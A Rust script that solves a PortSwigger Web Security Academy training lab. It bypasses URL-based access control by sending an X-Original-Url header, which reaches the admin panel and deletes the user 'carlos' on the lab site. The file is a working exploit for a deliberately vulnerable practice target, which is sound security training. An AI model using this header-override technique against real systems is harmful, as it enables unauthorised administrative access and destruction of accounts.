/****************************************************************
*
* Author: Ahmed Elqalawii
*
* Date: 5/9/2023
*
* PortSwigger LAB: URL-based access control can be circumvented
*
* Steps: 1. Fetch admin panel via X-Original-URL header
*        2. Delete carlos
*
*****************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0a8700e303d417e981ac430d00fc0088.web-security-academy.net";
    // build the client used in all subsequent requests
    let client = build_client();

    // fetch admin panel
    // this step in not necessary in the script, you can do step 2 directly
    // it's only a must when solving the lab using the browser
    print!("{} ", "1. Fetching admin panel..".white());
    io::stdout().flush();
    let admin_panel = client
        .get(url)
        .header("X-Original-Url", "/admin")
        .send()
        .expect(&format!("{}", "[!] Failed to fetch the admin panel".red()));
    println!("{}", "OK".green());

    // delete carlos
    print!("{} ", "2. Deleting carlos..".white());
    io::stdout().flush();
    let delete_carlos = client
        .get(format!("{url}?username=carlos"))
        .header("X-Original-Url", "/admin/delete")
        .send()
        .expect(&format!("{}", "[!] Failed to delete carlos".red()));
    println!("{}", "OK".green());

    println!(
        "{} {}",
        "[#] Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
 * Function used to build the client
 * Return a client that will be used in all subsequent requests
 ********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
